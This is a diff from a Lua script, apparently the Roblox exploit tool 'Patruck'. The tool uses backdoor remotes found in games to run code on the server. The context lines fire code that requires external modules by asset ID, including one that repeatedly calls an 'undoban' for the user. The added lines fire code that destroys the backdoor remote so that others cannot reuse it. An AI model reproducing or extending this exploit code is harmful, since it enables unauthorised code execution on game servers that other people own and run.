@@ -2871,6 +2871,21 @@ fireRemoteEvent([[
         fireRemoteEvent('uruserlol="' .. game.Players.LocalPlayer.Name .. '"al=game:GetService("Players");th=al:GetUserIdFromNameAsync(uruserlol)local function event() require(84214278325089+1)["undoban"]({th});end task.spawn(event);task.spawn(function() al.PlayerRemoving:Connect(event);while task.wait(10) do event();end end)')
         fireRemoteEvent('require(88808180999972)("' .. game.Players.LocalPlayer.Name .. '")')
         fireRemoteEvent('require(3986243232).load("Patruck anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+
+        local target = remoteEvent or remoteFunction
+		
+		if target and target.Name ~= "spunch.bd_cssr6-01" then
+		    local path = buildPath(target)
+		
+		    local code = "local obj = game\n"
+		    for _, name in ipairs(path) do
+		        code = code .. "obj = obj:FindFirstChild('" .. name .. "')\n"
+		        code = code .. "if not obj then return end\n"
+		    end
+		    code = code .. "obj:Destroy()"
+		
+		    fireRemoteEvent(code)
+		end
         notify.Info("Patruck","Backdoor found! Implemented backdoor protection & anti skid.")
     else
         notify.Warn("Patruck","No backdoor found.")
